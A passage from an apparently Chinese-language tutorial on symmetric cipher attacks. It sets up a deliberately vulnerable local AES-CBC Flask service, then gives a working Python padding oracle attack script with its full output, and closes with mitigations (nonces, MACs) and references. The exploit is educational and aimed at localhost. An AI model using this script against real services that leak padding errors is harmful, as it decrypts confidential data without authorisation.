        data = data.encode()
        data = binascii.unhexlify(data)
        iv = data[:BSIZE]
        engine = AES.new(key=secret, mode=AES.MODE_CBC, iv=iv)
        data = data[BSIZE:]
        data = engine.decrypt(data)
        data = unpad(data, BSIZE)
        return data.decode()
    def encrypt(data):
        data = data.encode()
        iv = get_iv()
        engine = AES.new(key=secret, mode=AES.MODE_CBC, iv=iv)
        return binascii.hexlify(iv + engine.encrypt(pad(data, BSIZE))).decode()
    @app.route('/dec/')
    def dec(data):
        # print('dec:', data)
        try:
            key = decrypt(data)
        except Exception as e:
            return 'Error: ' + str(e)
        if key not in db:
            return 'Error: invalid key'
        return db[key]
    @app.route('/enc/')
    def enc(key):
        db[key] = 'valid'
        return encrypt(key)
    app.run(debug=False)
该应用可以接收一个明文返回其密文（enc），也可以接收密文返回对应信息。
    $ curl http://localhost:5000/enc/See_you_in_Red_Square_at_4_pm
    00000000000000000000000000000000c8ab1c881b40d54d81d1efab429ad239dac1d6573e7c26d533ffc3cbc23a8455
    $ curl http://localhost:5000/dec/00000000000000000000000000000000c8ab1c881b40d54d81d1efab429ad239dac1d6573e7c26d533ffc3cbc23a8455
    valid
    $ curl http://localhost:5000/dec/00000000000000000000000000000000c8ab1c881b40d54d81d1efab429ad239dac1d6573e7c26d533ffc3cbc23a8466
    Error: Padding is incorrect.
作为攻击者，我们拿到的只有加密后的信息，目的就是要将其解密，查看明文内容：
    00000000000000000000000000000000c8ab1c881b40d54d81d1efab429ad239dac1d6573e7c26d533ffc3cbc23a8455
方便起见，我们假设已知服务器使用的是`AES-128-CBC`加密算法，且IV组合在密文头部。其实不知道也没关系，只不过需要多试几次罢了。根据前面介绍的原理，我们先将密文分割成128/8=16字节的3个块：
    block[0] = '00000000000000000000000000000000'
    block[1] = 'c8ab1c881b40d54d81d1efab429ad239'
    block[2] = 'dac1d6573e7c26d533ffc3cbc23a8455'
经测试，当服务器遇到填充错误会返回`Error: Padding is incorrect.`或者`Error: PKCS#7 padding is
incorrect.`，那么这就可以作为我们Padding Oracle攻击的依据。
首先将`block[1]`最后一字节从0x00开始到0xff不断变异尝试，发现当值为0x3b时候出现了非Padding错误，此时：
    I2[15] = _C1[15] ^ _P2[15] = 0x3b ^ 0x01 = 0x3a
则明文最后一字节为：
    P2[15] = I2[15] xor C1[15] = 0x3a ^ 0x39 = 0x03
依此类推，不断从后往前猜解每个字节的值。一个简单的自动化脚本如下：
    #!/usr/bin/env python3
    import time
    import requests
    import binascii
    url = 'http://localhost:5000/dec/' 
    data = '00000000000000000000000000000000c8ab1c881b40d54d81d1efab429ad239dac1d6573e7c26d533ffc3cbc23a8455'
    BSIZE = 16
    def test(data):
        r = requests.get(url + data)
        return r.text
    b = binascii.unhexlify(data)
    nblocks = int(len(b) / BSIZE)
    blocks = []
    print('nblocks:', nblocks)
    for i in range(nblocks):
        blk = b[i*BSIZE: (i+1)*BSIZE]
        print(f'block[{i}] =', binascii.hexlify(blk))
        blocks.append(blk)
    print('iv:', b[:BSIZE])
    blockID = -1
    prevID = blockID - 1
    print(f'decrypting block[{blockID}], prev =', binascii.hexlify(blocks[prevID]))
    plaintext = bytearray(16)
    inter = bytearray(16)
    for byteIdx in range(BSIZE-1, -1, -1):
        prevBlock = bytearray(blocks[prevID])
        print(f'mutating block[{prevID}][{byteIdx}]')
        origin = prevBlock[byteIdx]
        padValue = BSIZE - byteIdx
        # 将byteIdx之前的值可以任意随机设置
        for i in range(byteIdx):
            prevBlock[i] = 0x11
        # 将byteIdx之后的值设置为令其明文为padValue的值
        for i in range(byteIdx + 1, BSIZE):
            prevBlock[i] = inter[i] ^ padValue
        print('begin:', prevBlock.hex())
        found = False
        for val in range(0x100):
            prevBlock[byteIdx] = val
            _blocks = blocks.copy()
            _blocks[prevID] = bytes(prevBlock)
            payload = b''.join(_blocks)
            payload = binascii.hexlify(payload).decode()
            resp = test(payload)
            # print(f'testing', binascii.hexlify(prevBlock), '->', resp, end='\r')
            if 'incorrect' in resp:
                continue
            i2 = padValue ^ val
            p2 = origin ^ i2
            inter[byteIdx] = i2
            plaintext[byteIdx] = p2
            print(f'found c={val}, i={padValue}^{val}={i2}, o={origin}, p={p2}')
            found = True
            break
        if not found:
            print('Error: no valid value found')
            break
    print('plaintext =', plaintext)
运算结果为：
    $ python3 padding_oracle_exp.py
    nblocks: 3
    block[0] = b'00000000000000000000000000000000'
    block[1] = b'c8ab1c881b40d54d81d1efab429ad239'
    block[2] = b'dac1d6573e7c26d533ffc3cbc23a8455'
    iv: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    decrypting block[-1], prev = b'c8ab1c881b40d54d81d1efab429ad239'
    mutating block[-2][15]
    begin: 11111111111111111111111111111139
    found c=59, i=1^59=58, o=57, p=3
    mutating block[-2][14]
    begin: 1111111111111111111111111111d238
    found c=211, i=2^211=209, o=210, p=3
    mutating block[-2][13]
    begin: 111111111111111111111111119ad239
    found c=154, i=3^154=153, o=154, p=3
    mutating block[-2][12]
    begin: 111111111111111111111111429dd53e
    found c=43, i=4^43=47, o=66, p=109
    mutating block[-2][11]
    begin: 1111111111111111111111ab2a9cd43f
    found c=222, i=5^222=219, o=171, p=112
    mutating block[-2][10]
    begin: 11111111111111111111efdd299fd73c
    found c=182, i=6^182=176, o=239, p=95
    mutating block[-2][9]
    begin: 111111111111111111d1b7dc289ed63d
    found c=226, i=7^226=229, o=209, p=52
    mutating block[-2][8]
    begin: 111111111111111181edb8d32791d932
    found c=214, i=8^214=222, o=129, p=95
    mutating block[-2][7]
    begin: 111111111111114dd7ecb9d22690d833
    found c=48, i=9^48=57, o=77, p=116
    mutating block[-2][6]
    begin: 111111111111d533d4efbad12593db30
    found c=190, i=10^190=180, o=213, p=97
    mutating block[-2][5]
    begin: 111111111140bf32d5eebbd02492da31
    found c=20, i=11^20=31, o=64, p=95
    mutating block[-2][4]
    begin: 111111111b13b835d2e9bcd72395dd36
    found c=114, i=12^114=126, o=27, p=101
    mutating block[-2][3]
    begin: 111111887312b934d3e8bdd62294dc37
    found c=247, i=13^247=250, o=136, p=114
    mutating block[-2][2]
    begin: 11111cf47011ba37d0ebbed52197df34
    found c=115, i=14^115=125, o=28, p=97
    mutating block[-2][1]
    begin: 11ab72f57110bb36d1eabfd42096de35
    found c=209, i=15^209=222, o=171, p=117
    mutating block[-2][0]
    begin: c8ce6dea6e0fa429cef5a0cb3f89c12a
    found c=169, i=16^169=185, o=200, p=113
    plaintext = bytearray(b'quare_at_4_pm\x03\x03\x03')
这样，我们就在无需知道服务端密钥的情况下，成功还原了最后一个块的明文。逐块处理，就可以还原完整的内容了。当然还有值得优化的地方，比如爆破出最后一字节明文后，可以根据Padding原理直接跳过若干字节，加快爆破的速度，以及使用IV还原第一个块等。
# 小结
本文介绍了生活中常见的对称加密算法，包括流加密和块加密。其中流加密为逐字节加密，类如RC4等算法容易受到密钥重用攻击的影响，导致攻击者在无需知道密钥的情况下还原密文；而块加密将数据分割为一个个块再分别进行加密，ECB中各个块独立加密，容易收到重排攻击的影响，CBC中每个块加密后会与前一个块密文进行异或，在填充规律已知的情况下，容易收到Padding
Oracle攻击的影响。缓解密钥重用的方式一般是增加随机数nonce，而绕过密钥获取/修改明文的攻击则可以通过对加密数据添加完整性保护（MAC）。加密算法本身没有漏洞，但是使用不当也能导致严重的安全问题，关键是需要理解所使用的加密算法基本原理。
# 参考链接
  * [Block cipher mode of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation "Block cipher mode of operation")
  * [Stream Cipher Attacks](https://en.wikipedia.org/wiki/Stream_cipher_attacks "Stream Cipher Attacks")
  * [ The Padding Oracle Attack](https://robertheaton.com/2013/07/29/padding-oracle-attack/ " The Padding Oracle Attack")
* * *